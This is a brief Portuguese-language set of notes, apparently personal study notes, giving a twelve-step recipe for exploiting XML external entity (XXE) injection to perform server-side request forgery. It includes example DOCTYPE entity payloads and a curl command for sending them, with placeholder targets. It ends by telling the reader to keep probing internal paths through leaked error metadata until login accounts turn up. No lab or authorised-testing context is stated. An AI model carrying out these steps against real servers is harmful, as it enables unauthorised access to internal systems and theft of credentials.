PARA FAZER UMA EXPLORAÇÃO XXE PARA ATAQUE SSRF É A MESMA BASE.

	1.IR NA INSPEÇÃO

	2.NETWORK
	
	3.ANALISAR REQUISIÇÃO FEITA
	
	4.IR EM PAYLOAD
	
	5.COPIAR A REQUISIÇÃO DE PAYLOAD
	
	6.CRIAR UM ARQUIVO TXT E COLAR A REQUISIÇÃO
	
	7.ADICIONAR UM CÓDIGO PARA LER ARQUIVOS.
		EX: <!DOCTYPE foo[<!ENTITY nomearquivo SYSTEM 'http://ipdosite'>]>
		
	8.RENOMEAR O ID DA REQUISIÇÃO PARA O MESMO NOME COLOCADO NO ARQUIVO USANDO '&' ANTES DO
	NOME E ';' DEPOIS.
		EX: &nomearquivo;
	
	9.ENVIAR REQUISIÇÃO PELO TERMINAL:
		curl -d @nomearquivo http://URLDOSITE.com
	
	10.OCORRERÁ UM ERRO E NO FINAL DO ERRO UM VAZAMENTO DE META-DADO.
	
	11.DEPOIS ABRA O ARQUIVO NOVAMENTE E VÁ ATUALIZANDO A URL CONFORME FOR APARECENDO OUTROS
	META-DADOS. 
		EX: <!DOCTYPE foo[<!ENTITY nomearquivo SYSTEM 'http://ipdosite/nomedapasta'>]>
		
	12.FAÇA ISSO ATÉ ENCONTRAR DADOS COMPROMETEDORES COMO CONTAS DE LOGIN.
